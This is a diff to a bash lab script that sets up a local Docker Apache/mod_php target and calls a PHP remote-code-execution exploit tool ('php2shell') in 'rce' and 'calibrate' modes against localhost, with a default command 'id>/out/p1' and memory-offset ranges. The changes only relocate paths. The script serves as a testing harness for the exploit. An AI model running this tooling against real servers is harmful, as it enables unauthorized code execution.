@@ -1,16 +1,17 @@
 #!/usr/bin/env bash
 # php2shell local lab - single-worker prefork + mod_php, the config the chain needs.
-# usage:
-#   ./lab.sh up [php_version]     # default 8.4.26
-#   ./lab.sh rce [cmd] [version]
-#   ./lab.sh calibrate LO:HI:STEP [version]
-#   ./lab.sh down
+# usage (from the repo root or anywhere):
+#   ./lab/lab.sh up [php_version]     # default 8.4.26
+#   ./lab/lab.sh rce [cmd] [version]
+#   ./lab/lab.sh calibrate LO:HI:STEP [version]
+#   ./lab/lab.sh down
 set -u
-HERE=$(cd "$(dirname "$0")" && pwd)
-OUT=$HERE/lab-out
-INI=$HERE/lab/php.ini
-CONF=$HERE/lab/apache.conf
-WWW=$HERE/lab/www
+HERE=$(cd "$(dirname "$0")" && pwd)          # .../php2shell/lab
+ROOT=$(cd "$HERE/.." && pwd)                 # .../php2shell
+OUT=$HERE/out
+INI=$HERE/php.ini
+CONF=$HERE/apache.conf
+WWW=$HERE/www
 PORT=${PORT:-8088}
 VER=${VER:-8.4.26}
 
@@ -62,19 +63,19 @@ case "${1:-}" in
   rce)
     CMD=${2:-'id>/out/p1'}
     rm -f "$OUT/p1"
-    python3 "$HERE/php2shell.py" rce "http://127.0.0.1:$PORT/index.php" \
+    python3 "$ROOT/php2shell.py" rce "http://127.0.0.1:$PORT/index.php" \
       --cmd "$CMD" --proof-file "$OUT/p1" --docker-container php2shell-target --attempts 3
     ;;
   calibrate)
     RANGE=${2:-0x68e00:0x69400:0x8}
     rm -f "$OUT/p1"
-    python3 "$HERE/php2shell.py" calibrate "http://127.0.0.1:$PORT/index.php" \
+    python3 "$ROOT/php2shell.py" calibrate "http://127.0.0.1:$PORT/index.php" \
       --cmd 'id>/out/p1' --proof-file "$OUT/p1" --docker-container php2shell-target --range "$RANGE"
     ;;
   down)
     docker rm -f php2shell-target >/dev/null 2>&1 && echo "lab removed"
     ;;
   *)
-    sed -n '2,8p' "$0"
+    sed -n '2,9p' "$0"
     ;;
 esac
